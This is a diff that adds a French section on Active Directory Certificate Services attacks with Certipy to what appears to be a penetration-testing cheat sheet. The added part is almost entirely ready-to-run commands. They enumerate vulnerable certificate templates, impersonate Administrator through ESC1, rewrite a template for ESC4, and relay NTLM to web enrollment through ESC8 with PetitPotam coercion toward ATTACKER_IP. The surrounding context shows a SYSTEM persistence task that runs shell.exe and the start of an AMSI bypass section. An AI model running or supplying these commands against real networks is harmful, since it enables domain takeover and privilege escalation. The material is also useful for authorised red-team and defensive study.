@@ -287,6 +287,54 @@ schtasks /create /tn "Update" /tr "C:\temp\shell.exe" /sc onlogon /ru SYSTEM
 
 ---
 
+## ADCS / Certipy
+
+### Énumération
+
+```bash
+# Énumération complète
+certipy find -u user@domain.local -p 'pass' -dc-ip 192.168.56.10
+
+# Avec output BloodHound
+certipy find -u user@domain.local -p 'pass' -dc-ip 192.168.56.10 -bloodhound
+
+# Vulnérabilités uniquement
+certipy find -u user@domain.local -p 'pass' -dc-ip 192.168.56.10 -vulnerable
+```
+
+### Exploitation ESC1
+
+```bash
+# Demander un certificat pour un autre utilisateur
+certipy req -u user@domain.local -p 'pass' \
+    -ca 'CA-NAME' -target ca.domain.local \
+    -template 'VulnerableTemplate' \
+    -upn Administrator@domain.local
+
+# S'authentifier avec le certificat
+certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
+```
+
+### Exploitation ESC4
+
+```bash
+# Sauvegarder et modifier le template
+certipy template -u user@domain.local -p 'pass' -template 'Template' -save-old
+certipy template -u user@domain.local -p 'pass' -template 'Template' -configuration ESC1
+```
+
+### Exploitation ESC8 (Relay)
+
+```bash
+# Relay vers web enrollment
+certipy relay -target 'http://ca.domain.local/certsrv/certfnsh.asp' -ca 'CA-NAME'
+
+# Forcer auth (autre terminal)
+python3 PetitPotam.py ATTACKER_IP dc01.domain.local
+```
+
+---
+
 ## Defense Evasion
 
 ### AMSI Bypass
